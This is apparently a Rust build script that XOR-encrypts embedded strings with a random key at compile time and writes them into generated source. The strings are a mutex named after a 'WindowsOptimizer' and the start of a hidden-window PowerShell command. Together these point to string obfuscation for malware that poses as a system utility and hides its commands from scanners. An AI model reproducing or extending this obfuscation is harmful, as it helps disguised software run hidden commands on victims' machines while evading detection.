use std::io::Write;
use std::env;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = std::path::Path::new(&out_dir).join("xor_data.rs");
    let mut f = std::fs::File::create(dest_path).unwrap();

let key: u8 = rand::random::<u8>() % 250 + 1;





let secrets = vec![
        "\\WindowsOptimizer_Mutex",
        "powershell.exe -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms; "


 ];

    writeln!(f, "pub const XOR_KEY: u8 = {};", key).unwrap();
    writeln!(f, "pub const ENCRYPTED_STRINGS: &[&[u8]] = &[").unwrap();
    for s in &secrets {
        let enc: Vec<u8> = s.bytes().map(|b| b ^ key).collect();
        write!(f, "   &{:?},\n", enc).unwrap();
    }
    writeln!(f, "];").unwrap();
}
